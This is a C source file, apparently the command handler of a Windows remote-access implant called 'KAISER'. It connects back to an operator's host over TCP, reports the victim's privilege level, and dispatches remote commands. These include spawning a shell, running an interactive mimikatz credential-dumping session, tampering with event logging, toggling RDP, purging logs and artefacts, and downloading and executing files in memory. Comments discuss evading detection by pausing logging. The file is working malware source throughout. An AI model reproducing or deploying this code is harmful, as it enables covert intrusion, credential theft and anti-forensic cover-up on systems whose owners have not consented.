#include <stdio.h>
#include <string.h>

#include "command.h"
#include "dex.h"
#include "evtlog.h"
#include "mimikatz.h"
#include "networking.h"
#include "privilege.h"
#include "purge.h"
#include "rdp.h"
#include "shell.h"
#include "utils.h"

static SOCKET g_Socket = INVALID_SOCKET;

static BOOL bIsAdmin = FALSE;
static BOOL bIsSystem = FALSE;

ULONG UnimplementedFunction(INT argc, LPWSTR *argv) {
	NetSend(L"[%s]: This function is not implemented.\n", argv[0]);
	return (ULONG)-1;
}

CONST COMMAND_LIST clCommandList[] = {
	{ UnimplementedFunction, L"help", L"Displays this menu." },
	{ UnimplementedFunction, L"status", L"Displays the status."},
	{ ShellMain, L"shell", L"Spawns a shell." },
	{ MimikatzMain, L"mimikatz", L"Spawns an interactive mimikatz shell." },
	{ EvtlogMain, L"evtlog", L"Controls the event logging service." },
	{ RdpMain, L"rdp", L"Enables/Disables RDP." },
	{ PurgeMain, L"purge", L"Uninstall from the system. Optionally destroys logs and execution artefacts." },
	{ DexMain, L"dex", L"Download and execute a file without touching disk." },
	{ UnimplementedFunction, L"exit", L"Quits the session and closes the network connection." },
};

// Need this for the socket that exists in this file scope.
// Size limit NET_BUF_SIZE.
INT NetSend(LPCWSTR fmt, ...) {
	WCHAR szBuf[NET_BUF_SIZE + 1];
	va_list args;

	ZeroMemory(szBuf, SIZEOF_ARRAY(szBuf));

	va_start(args, fmt);
	_vswprintf_p(szBuf, SIZEOF_ARRAY(szBuf) - sizeof(WCHAR), fmt, args);

	return Send(g_Socket, szBuf);
}

static void CommandPrintHelp(void) {
	NetSend(L"\t\t.:: HELP MENU ::.\n\n");
	for (SIZE_T i = 0; i < SIZEOF_ARRAY(clCommandList); i++) {
		NetSend(L"\t%-12s:\t%s\n", clCommandList[i].lpCommandName, clCommandList[i].lpDescription);
	}
	NetSend(L"\n\tFor more information, type <COMMAND> help.\n\n");
}

ULONG PrintStatus(void) {
	return ERROR_SUCCESS;
}

static void CommandPrintStatus(void) {
	// TODO command print status
	// Integrity level check.
	// Public IP?
}

// Sets up the command's module to be called.
static void CommandBootstrap(LPCOMMAND_FUNC cfFunction, LPCWSTR lpCmdLine) {
	// Ideally, event logging should be disabled here
	// when executing functionality. It is a bit 
	// difficult to coordinate threading and multiple
	// functionality.
	// I will leave the trust to the operator to know 
	// what they are doing. If not, they deserve to be 
	// caught! >:)

	int argc = 0;
	LPWSTR *argv = CommandLineToArgvW(lpCmdLine, &argc);
	if (argv == NULL) {
		Debug(FAILURE, L"CommandLineToArgvW failed; error: %lu", GetLastError());
	} else {
		// Call the command with its parameters.
		cfFunction(argc, argv);

		// Free up resources.
		LocalFree(argv);
	}

	// Ideally, event logging should be re-enabled here
	// so that logs can be generated like normal.
	// Systems may be alerted if logging suddenly stops.
}

// WARNING! lpCommand gets clobbered in this function!
// Commands should be in the following format:
// <COMMAND NAME> [ARG LIST]
static INT CommandHandler(LPWSTR lpCommand) {
	// Save the command line before it gets clobbered by strtok. Freed by callee.
	LPWSTR lpCmdLine = _wcsdup(lpCommand);

	// Let's split the string delimited by spaces.
	LPCWSTR szDelim = L" ";
	LPWSTR lpToken = NULL;
	LPWSTR lpNextToken = NULL;

	// Get the command name.
	lpToken = wcstok_s(lpCommand, szDelim, &lpNextToken);

	// Check if help.
	if (!_wcsnicmp(lpToken, OPTION_STRING_HELP, wcslen(OPTION_STRING_HELP))) {
		CommandPrintHelp();
		return 0;
	}

	if (lpToken != NULL) {
		// Determine if it is a command. If it isn't, then we don't need to continue.
		for (int i = 0; i < SIZEOF_ARRAY(clCommandList); i++) {
			if (!_wcsnicmp(lpToken, clCommandList[i].lpCommandName, wcslen(clCommandList[i].lpCommandName))) {
				// Set up the command module's parameters and execute it.
				CommandBootstrap(clCommandList[i].lpFunction, lpCmdLine);
				free(lpCmdLine);
				break;
			}
		}
	}

	return 0;
}

static INT CommandReceiver(CONST SOCKET g_Socket) {
	BOOL bReceive = TRUE;
	// recv takes CHAR instead of WCHAR.
	LPWSTR szCommandBuf = NULL;
	INT iSuccess;

	if (PrivilegeIsElevated(&bIsAdmin) == ERROR_SUCCESS) {
		PrivilegeIsLocalSystem(&bIsSystem);
	}

	//Send(g_Socket, KAISER_BANNER);
	send(g_Socket, KAISER_BANNER, strlen(KAISER_BANNER), 0);
	if (bIsSystem) {
		Send(g_Socket, L"Privilege level: SYSTEM.\n\n");
	} else if (bIsAdmin) {
		Send(g_Socket, L"Privilege level: Administrator.\n\n");
	} else {
		Send(g_Socket, L"Privilege level: Standard user.\n\n");
	}

	// Network loop.
	do {
		Send(g_Socket, KAISER_PROMPT);
		// Receive the message and check for error.
		iSuccess = Receive(g_Socket, &szCommandBuf);
		if (iSuccess == -1) {
			if (iSuccess == SOCKET_ERROR) {
				break;
			}
			Debug(FAILURE, L"Failed to receive message; error: %lu", WSAGetLastError());
		} else if (iSuccess == -2) {
			Debug(FAILURE, L"Failed to convert received message to wide char; error: %lu", GetLastError());
		}

		// Check if there's anything in the command.
		if (szCommandBuf != NULL) {
			if (wcslen(szCommandBuf) > 0) {
				if (!_wcsnicmp(szCommandBuf, L"exit", 4)) {
					// Quit.
					bReceive = FALSE;
				} else {
					// Parse and do the command.
					iSuccess = CommandHandler(szCommandBuf);
					if (iSuccess == -1) {
						Debug(FAILURE, L"CommandHandler error: %lu", GetLastError());
					}
				}
			}

			// Free szCommandBuf
			_HeapFree(szCommandBuf);
		}
	} while (bReceive);

	return 0;
}

ULONG CommandStartReceiver(void) {
	ULONG uSuccess = 0;
	uSuccess = TcpConnect(&g_Socket, ADDRESS, PORT);
	if (uSuccess) {
		//Debug(FAILURE, L"Failed to create a TCP connection; error: %lu", WSAGetLastError());
		if (uSuccess != WSAETIMEDOUT && uSuccess != WSAECONNREFUSED) {
			if (g_Socket != INVALID_SOCKET) {
				CloseTcpSocket(g_Socket);
			}
			return uSuccess;
		}
	}

	uSuccess = CommandReceiver(g_Socket);
	if (uSuccess) {
		Debug(FAILURE, L"Receiver error: %d", uSuccess);
	}

	CloseTcpSocket(g_Socket);

	return 0;
}